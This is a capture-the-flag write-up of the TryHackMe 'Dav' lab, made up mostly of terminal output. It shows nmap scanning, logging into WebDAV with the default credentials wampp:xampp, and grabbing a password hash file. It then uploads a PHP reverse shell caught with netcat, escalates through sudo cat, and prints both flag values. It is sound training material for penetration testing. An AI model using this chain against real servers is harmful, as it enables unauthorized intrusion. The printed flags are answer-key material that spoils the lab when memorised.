![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/Dav.png)
# Dav

# 1. scanning
~~~
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ sudo nmap -sV -A -T4 10.10.161.184 -oN nmap
[sudo] password for alpha: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 11:34 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 11:35 (0:00:00 remaining)
Nmap scan report for 10.10.161.184
Host is up (0.26s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/1%OT=80%CT=1%CU=38899%PV=Y%DS=2%DC=T%G=Y%TM=651991C
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=Z%II=I%TS=8)SEQ(SP=1
OS:00%GCD=1%ISR=104%TI=Z%CI=I%TS=8)SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=I%II=I%
OS:TS=8)SEQ(SP=101%GCD=2%ISR=103%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW6%O2=M508S
OS:T11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=
OS:68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=
OS:M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   305.37 ms 10.8.0.1
2   306.07 ms 10.10.161.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.51 seconds
                                                                                                                                                                       
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ sudo nmap -sV -sS  10.10.161.184 -oN nmap-v2
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 11:36 EDT
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.42% done; ETC: 11:38 (0:00:54 remaining)
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.27% done; ETC: 11:41 (0:02:26 remaining)
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.28% done; ETC: 11:41 (0:02:27 remaining)
Stats: 0:03:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 54.70% done; ETC: 11:43 (0:03:06 remaining)
Stats: 0:09:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.87% done; ETC: 11:51 (0:05:05 remaining)
Stats: 0:15:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.91% done; ETC: 11:53 (0:01:01 remaining)
Nmap scan report for 10.10.161.184
Host is up (0.32s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
9/tcp     filtered discard
80/tcp    open     http            Apache httpd 2.4.18 ((Ubuntu))
1077/tcp  filtered imgames
1081/tcp  filtered pvuniwien
2107/tcp  filtered msmq-mgmt
4045/tcp  filtered lockd
10012/tcp filtered unknown
17877/tcp filtered unknown
32780/tcp filtered sometimes-rpc23
34572/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1138.60 seconds
~~~
# 2 web enumiration
![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/defaultweb.png)
~~~
There is no `robots.txt` file that may have disclosed hidden locations, but dirsearch found a `/webdav/` directory, which requires an authentication.

Searching for the terms `default credentials webdav` on Google leads to [this link](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) that applies to XAMPP, but why not giving it a try?
Guess what? It worked with `wampp:xampp`!
~~~
![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/after%20authentication.png)
# 3. webdav

~~~
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ wget http://10.10.161.184/webdav/passwd.dav
--2023-10-01 11:43:56--  http://10.10.161.184/webdav/passwd.dav
Connecting to 10.10.161.184:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized

Username/Password Authentication Failed.
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ wget --http-user="wampp" --http-password="xampp"  http://10.10.161.184/webdav/passwd.dav
--2023-10-01 11:44:50--  http://10.10.161.184/webdav/passwd.dav
Connecting to 10.10.161.184:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm="webdav"
Reusing existing connection to 10.10.161.184:80.
HTTP request sent, awaiting response... 200 OK
Length: 44
Saving to: ‘passwd.dav’

passwd.dav                        100%[==========================================================>]      44  --.-KB/s    in 0s      

2023-10-01 11:44:52 (1.36 MB/s) - ‘passwd.dav’ saved [44/44]

                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ ls
nmap  nmap-v2  passwd.dav
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ file passwd.dav   
passwd.dav: ASCII text
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ cat passwd.dav                                                                                       
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

~~~
# 4. revershell
~~~
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ locate php reverse
/home/alpha/ctf/BankCTF/php-reverse-shell.php
/home/alpha/ctf/convertmyvideo/php-reverse-shell.php
/home/alpha/cybergirl/What-the-Shell?/php-reverse-shell.php
/usr/share/doc/metasploit-framework/modules/payload/php/meterpreter/reverse_tcp.md
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/metasploit-framework/lib/msf/core/payload/php/reverse_tcp.rb
/usr/share/metasploit-framework/modules/payloads/singles/cmd/unix/reverse_php_ssl.rb
/usr/share/metasploit-framework/modules/payloads/singles/php/meterpreter_reverse_tcp.rb
/usr/share/metasploit-framework/modules/payloads/singles/php/reverse_perl.rb
/usr/share/metasploit-framework/modules/payloads/singles/php/reverse_php.rb
/usr/share/metasploit-framework/modules/payloads/stagers/php/reverse_tcp.rb
/usr/share/metasploit-framework/modules/payloads/stagers/php/reverse_tcp_uuid.rb
/usr/share/webshells/php/php-reverse-shell.php
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ cp /home/alpha/ctf/BankCTF/php-reverse-shell.php .
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ ls                
nmap  nmap-v2  passwd.dav  php-reverse-shell.php
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ gedit php-reverse-shell.php                                                                          

(gedit:322352): Gtk-WARNING **: 11:50:47.077: Calling org.xfce.Session.Manager.Inhibit failed: GDBus.Error:org.freedesktop.DBus.Error.UnknownMethod: No such method “Inhibit”
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ curl -u "wampp:xampp" -X PUT http://10.10.161.184/webdav/test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/test has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.161.184 Port 80</address>
</body></html>
                                                                                                                                     
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ cadaver http://10.10.161.184/webdav/                         
Authentication required for webdav on server `10.10.161.184':
Username: wampp
Password: 
dav:/webdav/> put php-reverse-shell.php 
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 5492 bytes succeeded.
dav:/webdav/> quit
Connection to `10.10.161.184' closed.
~~~
![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/reverseshell.png)
# 5. UserFlag
~~~
┌──(alpha㉿sploit)-[~/ctf/DAv]
└─$ nc -nlvp 1900      
listening on [any] 1900 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.161.184] 49188
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 08:54:41 up 22 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
www-data@ubuntu:/$ cd home
cd home
www-data@ubuntu:/home$ ls
ls
merlin  wampp
www-data@ubuntu:/home$ cd merlin
cd merlin
www-data@ubuntu:/home/merlin$ ls
ls
user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
www-data@ubuntu:/home/merlin$ ls -la
ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$
~~~
# 6. rootflag
~~~
www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
www-data@ubuntu:/home/merlin$
~~~
